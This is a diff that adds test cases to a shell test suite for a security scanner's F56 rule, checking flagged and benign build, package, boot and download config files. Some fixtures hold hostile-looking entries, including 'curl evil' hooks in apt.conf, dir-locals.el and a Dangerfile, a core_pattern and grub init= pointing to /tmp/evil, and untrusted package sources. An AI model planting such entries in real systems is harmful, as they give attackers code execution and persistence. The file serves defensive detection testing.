@@ -8774,6 +8774,114 @@ printf 'text/plain=vim.desktop\n' > "$XDIR/mh2/mimeapps.list"
 ./hlse_core file "$XDIR/mh2/mimeapps.list" 2>&1 | grep -q "F56" \
     && check "file: benign mimeapps no F56" "0" "1" \
     || check "file: benign mimeapps no F56" "0" "0"
+# F56: package/build descriptor + boot/kernel carriers
+mkdir -p "$XDIR/pk1" "$XDIR/pk2"
+printf '[[source]]\nurl = "http://evil"\n' > "$XDIR/pk1/Pipfile"
+./hlse_core file "$XDIR/pk1/Pipfile" 2>&1 | grep -q "F56" \
+    && check "file: Pipfile source flagged" "0" "0" \
+    || check "file: Pipfile source flagged" "0" "1"
+printf '[packages]\nrequests = "*"\n' > "$XDIR/pk2/Pipfile"
+./hlse_core file "$XDIR/pk2/Pipfile" 2>&1 | grep -q "F56" \
+    && check "file: benign Pipfile no F56" "0" "1" \
+    || check "file: benign Pipfile no F56" "0" "0"
+printf 'register_toolchains("//:x")\n' > "$XDIR/pk1/MODULE.bazel"
+./hlse_core file "$XDIR/pk1/MODULE.bazel" 2>&1 | grep -q "F56" \
+    && check "file: MODULE.bazel toolchains flagged" "0" "0" \
+    || check "file: MODULE.bazel toolchains flagged" "0" "1"
+printf 'bazel_dep(name = "rules_go", version = "0.1")\n' \
+    > "$XDIR/pk2/MODULE.bazel"
+./hlse_core file "$XDIR/pk2/MODULE.bazel" 2>&1 | grep -q "F56" \
+    && check "file: benign MODULE.bazel no F56" "0" "1" \
+    || check "file: benign MODULE.bazel no F56" "0" "0"
+printf 'from conans import ConanFile\nimport os\nos.system("x")\n' \
+    > "$XDIR/pk1/conanfile.py"
+./hlse_core file "$XDIR/pk1/conanfile.py" 2>&1 | grep -q "F56" \
+    && check "file: conanfile os.system flagged" "0" "0" \
+    || check "file: conanfile os.system flagged" "0" "1"
+printf 'from conans import ConanFile\nclass P(ConanFile):\n    pass\n' \
+    > "$XDIR/pk2/conanfile.py"
+./hlse_core file "$XDIR/pk2/conanfile.py" 2>&1 | grep -q "F56" \
+    && check "file: benign conanfile no F56" "0" "1" \
+    || check "file: benign conanfile no F56" "0" "0"
+printf 'tap "evil/x"\nbrew "x"\n' > "$XDIR/pk1/Brewfile"
+./hlse_core file "$XDIR/pk1/Brewfile" 2>&1 | grep -q "F56" \
+    && check "file: Brewfile tap flagged" "0" "0" \
+    || check "file: Brewfile tap flagged" "0" "1"
+mkdir -p "$XDIR/dl1" "$XDIR/dl2"
+printf 'on-download-complete=/tmp/evil.sh\n' > "$XDIR/dl1/aria2.conf"
+./hlse_core file "$XDIR/dl1/aria2.conf" 2>&1 | grep -q "F56" \
+    && check "file: aria2 on-download flagged" "0" "0" \
+    || check "file: aria2 on-download flagged" "0" "1"
+printf 'download-rate = 100\n' > "$XDIR/dl2/aria2.conf"
+./hlse_core file "$XDIR/dl2/aria2.conf" 2>&1 | grep -q "F56" \
+    && check "file: benign aria2 no F56" "0" "1" \
+    || check "file: benign aria2 no F56" "0" "0"
+printf 'XferCommand = /usr/bin/curl %%u -o %%o\n' > "$XDIR/dl1/pacman.conf"
+./hlse_core file "$XDIR/dl1/pacman.conf" 2>&1 | grep -q "F56" \
+    && check "file: pacman XferCommand flagged" "0" "0" \
+    || check "file: pacman XferCommand flagged" "0" "1"
+printf 'APT::Update::Post-Invoke {"curl evil"};\n' > "$XDIR/dl1/apt.conf"
+./hlse_core file "$XDIR/dl1/apt.conf" 2>&1 | grep -q "F56" \
+    && check "file: apt.conf Post-Invoke flagged" "0" "0" \
+    || check "file: apt.conf Post-Invoke flagged" "0" "1"
+printf 'APT::Get::Assume-Yes "true";\n' > "$XDIR/dl2/apt.conf"
+./hlse_core file "$XDIR/dl2/apt.conf" 2>&1 | grep -q "F56" \
+    && check "file: benign apt.conf no F56" "0" "1" \
+    || check "file: benign apt.conf no F56" "0" "0"
+mkdir -p "$XDIR/kb1" "$XDIR/kb2"
+printf 'kernel.core_pattern = |/tmp/evil\n' > "$XDIR/kb1/sysctl.conf"
+./hlse_core file "$XDIR/kb1/sysctl.conf" 2>&1 | grep -q "F56" \
+    && check "file: sysctl core_pattern flagged" "0" "0" \
+    || check "file: sysctl core_pattern flagged" "0" "1"
+printf 'net.ipv4.ip_forward=1\n' > "$XDIR/kb2/sysctl.conf"
+./hlse_core file "$XDIR/kb2/sysctl.conf" 2>&1 | grep -q "F56" \
+    && check "file: benign sysctl no F56" "0" "1" \
+    || check "file: benign sysctl no F56" "0" "0"
+printf 'Section "Files"\n ModulePath "/tmp/evil"\nEndSection\n' \
+    > "$XDIR/kb1/xorg.conf"
+./hlse_core file "$XDIR/kb1/xorg.conf" 2>&1 | grep -q "F56" \
+    && check "file: xorg ModulePath flagged" "0" "0" \
+    || check "file: xorg ModulePath flagged" "0" "1"
+printf 'set default=0\nmenuentry "x" { linux /vmlinuz init=/tmp/evil }\n' \
+    > "$XDIR/kb1/grub.cfg"
+./hlse_core file "$XDIR/kb1/grub.cfg" 2>&1 | grep -q "F56" \
+    && check "file: grub init= flagged" "0" "0" \
+    || check "file: grub init= flagged" "0" "1"
+printf 'set default=0\nset timeout=5\n' > "$XDIR/kb2/grub.cfg"
+./hlse_core file "$XDIR/kb2/grub.cfg" 2>&1 | grep -q "F56" \
+    && check "file: benign grub no F56" "0" "1" \
+    || check "file: benign grub no F56" "0" "0"
+printf 'SHELL=/bin/sh\n@daily root /tmp/evil\n' > "$XDIR/kb1/anacrontab"
+./hlse_core file "$XDIR/kb1/anacrontab" 2>&1 | grep -q "F56" \
+    && check "file: anacrontab flagged" "0" "0" \
+    || check "file: anacrontab flagged" "0" "1"
+printf '((nil . ((eval . (shell-command "curl evil")))))\n' \
+    > "$XDIR/kb1/dir-locals.el"
+./hlse_core file "$XDIR/kb1/dir-locals.el" 2>&1 | grep -q "F56" \
+    && check "file: dir-locals eval flagged" "0" "0" \
+    || check "file: dir-locals eval flagged" "0" "1"
+printf '((c-mode . ((indent-tabs-mode . t))))\n' \
+    > "$XDIR/kb2/dir-locals.el"
+./hlse_core file "$XDIR/kb2/dir-locals.el" 2>&1 | grep -q "F56" \
+    && check "file: benign dir-locals no F56" "0" "1" \
+    || check "file: benign dir-locals no F56" "0" "0"
+printf 'system.method.set_key = x\nschedule = y,1,1,"execute=/tmp/e"\n' \
+    > "$XDIR/dl1/.rtorrent.rc"
+./hlse_core file "$XDIR/dl1/.rtorrent.rc" 2>&1 | grep -q "F56" \
+    && check "file: rtorrent execute flagged" "0" "0" \
+    || check "file: rtorrent execute flagged" "0" "1"
+printf 'sh "curl evil"\n' > "$XDIR/pk1/Dangerfile"
+./hlse_core file "$XDIR/pk1/Dangerfile" 2>&1 | grep -q "F56" \
+    && check "file: Dangerfile sh flagged" "0" "0" \
+    || check "file: Dangerfile sh flagged" "0" "1"
+printf 'deb http://evil stable main\n' > "$XDIR/dl1/sources.list"
+./hlse_core file "$XDIR/dl1/sources.list" 2>&1 | grep -q "F56" \
+    && check "file: sources.list deb flagged" "0" "0" \
+    || check "file: sources.list deb flagged" "0" "1"
+printf 'DLAGENTS=("https::/tmp/evil %%u %%o")\n' > "$XDIR/dl1/makepkg.conf"
+./hlse_core file "$XDIR/dl1/makepkg.conf" 2>&1 | grep -q "F56" \
+    && check "file: makepkg DLAGENTS flagged" "0" "0" \
+    || check "file: makepkg DLAGENTS flagged" "0" "1"
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
